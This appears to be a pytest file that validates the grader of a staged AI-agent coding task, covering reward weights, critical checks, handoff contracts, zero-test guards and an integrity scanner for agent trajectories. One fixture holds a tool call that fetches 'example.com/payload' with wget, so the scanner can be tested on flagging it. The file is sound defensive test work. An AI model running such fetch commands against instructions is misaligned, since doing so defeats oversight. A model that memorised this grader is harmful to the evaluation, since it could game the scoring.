"""Verifier self-validation for reward weights, critical gates, and handoff contract."""
from __future__ import annotations

import json
import tempfile
from pathlib import Path

import pytest

import stage_check
from stage_check import (
    CRITICAL_CHECKS,
    HANDOFF_FIELDS,
    WEIGHTS,
    json_contract,
    write_reward,
)
from score_formula import REWARD_JSON_CORE_KEYS, reward_json_shape_ok


@pytest.mark.parametrize("stage", list(WEIGHTS))
def test_weights_sum_to_one(stage: str) -> None:
    total = sum(WEIGHTS[stage].values())
    assert abs(total - 1.0) < 1e-6, f"{stage} weights sum to {total}"


@pytest.mark.parametrize("stage", list(CRITICAL_CHECKS))
def test_critical_checks_are_weighted(stage: str) -> None:
    for name in CRITICAL_CHECKS[stage]:
        assert name in WEIGHTS[stage], f"{name} missing from {stage} weights"


@pytest.mark.parametrize("stage", [s for s in WEIGHTS if s != "01-diagnose"])
def test_executable_checks_dominate(stage: str) -> None:
    executable = 0.0
    for name, weight in WEIGHTS[stage].items():
        if name in {
            "build_clean",
            "full_build",
            "hidden_tests_pass",
            "vet_clean",
            "volumebinding_tests",
        }:
            executable += weight
    assert executable >= 0.50, f"{stage} executable weight {executable} < 0.50"


def test_reward_json_shape() -> None:
    assert reward_json_shape_ok(REWARD_JSON_CORE_KEYS)


def test_stage04_handoff_rejects_empty_next_steps(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    handoff = tmp_path / "handoff.json"
    handoff.write_text(
        json.dumps(
            {
                "stage": "04-volume-binding-harden",
                "summary": "done",
                "next_steps": [],
                "merge_ready": True,
            }
        )
        + "\n",
        encoding="utf-8",
    )
    ok, note = json_contract(handoff, dict(HANDOFF_FIELDS))
    assert not ok
    assert "next_steps" in note


def test_stage04_handoff_accepts_completion_note(tmp_path: Path) -> None:
    handoff = tmp_path / "handoff.json"
    handoff.write_text(
        json.dumps(
            {
                "stage": "04-volume-binding-harden",
                "summary": "done",
                "next_steps": ["Task complete."],
                "merge_ready": True,
            }
        )
        + "\n",
        encoding="utf-8",
    )
    ok, note = json_contract(handoff, dict(HANDOFF_FIELDS))
    assert ok, note


def test_stage04_critical_checks_include_closure_gates():
    critical = set(stage_check.CRITICAL_CHECKS["04-volume-binding-harden"])
    assert {"installer_go125", "implementation_closure"}.issubset(critical)


def test_zero_test_guard_rejects_empty_pattern_match(monkeypatch: pytest.MonkeyPatch):
    def fake_go_cmd(args: list[str], timeout: int) -> tuple[int, str]:
        return 0, "testing: warning: no tests to run\n"

    monkeypatch.setattr(stage_check, "go_cmd", fake_go_cmd)
    ok, note, _ = stage_check.go_test(["./verifierprobe/..."], run_pattern="^TestDoesNotExist$")
    assert not ok
    assert "zero tests" in note.lower()


def test_zero_test_guard_rejects_vacuous_pass(monkeypatch: pytest.MonkeyPatch):
    def fake_go_cmd(args: list[str], timeout: int) -> tuple[int, str]:
        return 0, "ok  \texample/pkg\t0.001s\n"

    monkeypatch.setattr(stage_check, "go_cmd", fake_go_cmd)
    ok, note, _ = stage_check.go_test(["./verifierprobe/..."], run_pattern="^TestDoesNotExist$")
    assert not ok
    assert "no hidden tests reported pass" in note.lower()


def test_write_reward_payload() -> None:
    stage = "04-volume-binding-harden"
    checks = {name: {"passed": True, "detail": "ok"} for name in WEIGHTS[stage]}
    integrity = {"passed": True, "findings": [], "notes": [], "detail": "clean"}
    with tempfile.TemporaryDirectory() as tmp:
        result_dir = Path(tmp)
        old = stage_check.RESULT_DIR
        stage_check.RESULT_DIR = result_dir
        try:
            binary = write_reward(stage, checks, integrity)
            payload = json.loads((result_dir / "reward.json").read_text(encoding="utf-8"))
            events = json.loads((result_dir / "reward-events.json").read_text(encoding="utf-8"))
            details = json.loads((result_dir / "reward-details.json").read_text(encoding="utf-8"))
        finally:
            stage_check.RESULT_DIR = old
    assert binary == 1.0
    assert payload["binary_reward"] == 1.0
    assert payload["stage_complete"] == 1.0
    assert payload["training_score"] == 1.0
    assert events["stage"] == stage
    assert events["integrity_ok"] is True
    assert details["critical_pass"] is True
    assert "non_critical_checks" in details


def test_atif_integrity_ignores_wget_in_system_prompt(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    trajectory = {
        "steps": [
            {
                "step_id": 1,
                "source": "user",
                "message": "Example slow command: wget [file] in the system prompt only.",
            },
            {
                "step_id": 2,
                "source": "agent",
                "tool_calls": [
                    {
                        "function_name": "bash_command",
                        "arguments": {"keystrokes": "ls -la /testbed\n", "duration": 0.1},
                    }
                ],
            },
        ]
    }
    agent_logs = tmp_path / "agent"
    agent_logs.mkdir()
    (agent_logs / "trajectory.json").write_text(json.dumps(trajectory) + "\n", encoding="utf-8")
    monkeypatch.setattr(stage_check, "AGENT_LOGS", agent_logs)
    monkeypatch.setattr(stage_check, "OUTPUT", tmp_path / "output")
    ok, report = stage_check.integrity("01-diagnose")
    assert ok, report
    assert report["findings"] == []


def test_atif_integrity_flags_forbidden_executed_command(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    trajectory = {
        "steps": [
            {
                "step_id": 1,
                "source": "user",
                "message": "Do not run network commands.",
            },
            {
                "step_id": 2,
                "source": "agent",
                "tool_calls": [
                    {
                        "function_name": "bash_command",
                        "arguments": {"keystrokes": "wget https://example.com/payload\n", "duration": 1.0},
                    }
                ],
            },
        ]
    }
    agent_logs = tmp_path / "agent"
    agent_logs.mkdir()
    (agent_logs / "trajectory.json").write_text(json.dumps(trajectory) + "\n", encoding="utf-8")
    monkeypatch.setattr(stage_check, "AGENT_LOGS", agent_logs)
    monkeypatch.setattr(stage_check, "OUTPUT", tmp_path / "output")
    ok, report = stage_check.integrity("01-diagnose")
    assert not ok
    assert any("forbidden command" in finding for finding in report["findings"])


def test_collect_executed_command_lines_reads_shell_scripts(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    output = tmp_path / "output" / "01-diagnose"
    output.mkdir(parents=True)
    (output / "reproduce.sh").write_text("# probe\nls -la /testbed\n", encoding="utf-8")
    monkeypatch.setattr(stage_check, "AGENT_LOGS", tmp_path / "agent")
    monkeypatch.setattr(stage_check, "OUTPUT", tmp_path / "output")
    lines = stage_check.collect_executed_command_lines()
    assert "ls -la /testbed" in lines
